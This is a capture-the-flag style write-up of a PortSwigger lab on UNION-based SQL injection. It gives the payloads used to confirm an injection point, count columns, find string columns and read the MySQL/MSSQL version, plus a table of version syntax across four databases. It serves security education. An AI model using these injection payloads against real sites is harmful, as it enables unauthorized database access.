# SQL Injection Attack — Querying Database Type and Version on MySQL and Microsoft

> This writeup follows the OWASP Web Security Testing Guide (WSTG) methodology.

---

## Goal

Display the database version string using a UNION-based SQL injection attack.

---

## Lab

https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft

---

## OWASP Category

A03:2021 – Injection

---

## Core Concept

This is a **UNION-based SQL injection** — the application returns query results directly in the response.

On **MySQL and Microsoft SQL Server**, the version is stored in a global variable:

```sql
SELECT @@version
```

MySQL uses `#` as comment character or `-- ` (with space). MSSQL uses `--`.

---

## Steps to Solve

---

**Step 1 — Find the Injection Point**

The injection point is the **product category filter**:

```
/filter?category=Gifts'
```

Application returns an error — injection confirmed.

<img width="1176" height="470" alt="image" src="https://github.com/user-attachments/assets/66c99f13-3fe5-4897-8b9b-3e0468d6b069" />

---

**Step 2 — Find Number of Columns**

```
/filter?category=Gifts' ORDER BY 1--+
/filter?category=Gifts' ORDER BY 2--+
/filter?category=Gifts' ORDER BY 3--+
```

> **Why `--+`?** In MySQL the comment `--` requires a space after it. The `+` in a URL becomes a space — so `--+` = `-- ` which MySQL recognizes as a valid comment.

<img width="1532" height="476" alt="image" src="https://github.com/user-attachments/assets/63621498-87f8-4c65-9feb-fe0f95270073" />

Confirm with UNION NULL:

```
/filter?category=Gifts' UNION SELECT NULL,NULL--+
```

Columns found: **2**

<img width="1338" height="425" alt="image" src="https://github.com/user-attachments/assets/69e26ce8-79b7-4bbb-844c-d1f923ad7351" />

---

**Step 3 — Find String Columns**

```
/filter?category=Gifts' UNION SELECT 'a','b'--+
```

Both columns return strings.

<img width="723" height="194" alt="image" src="https://github.com/user-attachments/assets/c962dea4-2c7a-417c-a0c6-28ab41daffce" />

---

**Step 4 — Extract Database Version**

```
/filter?category=Gifts' UNION SELECT @@version,NULL--+
```

Version string appears in the page response showing MySQL or MSSQL version.

<img width="383" height="49" alt="image" src="https://github.com/user-attachments/assets/d3d5bec7-d957-4c1f-ab23-0de2d062889e" />

---

**Lab Solved**

<img width="1476" height="628" alt="image" src="https://github.com/user-attachments/assets/30abd956-9dc8-4238-92da-0c576da8e2d2" />

---

## Key MySQL/MSSQL Differences

| | MySQL | MSSQL | Oracle | PostgreSQL |
|--|-------|-------|--------|-----------|
| Version | `@@version` | `@@version` | `v$version` | `version()` |
| Comment | `-- ` or `#` | `--` | `--` | `--` |
| FROM needed | No | No | Yes (dual) | No |

---

*This writeup is intended for educational purposes only. All techniques documented here were performed on PortSwigger's intentionally vulnerable practice platform. The author does not encourage or condone the use of these methods against any system without explicit written permission. Unauthorized use of these techniques may violate applicable laws and regulations.*
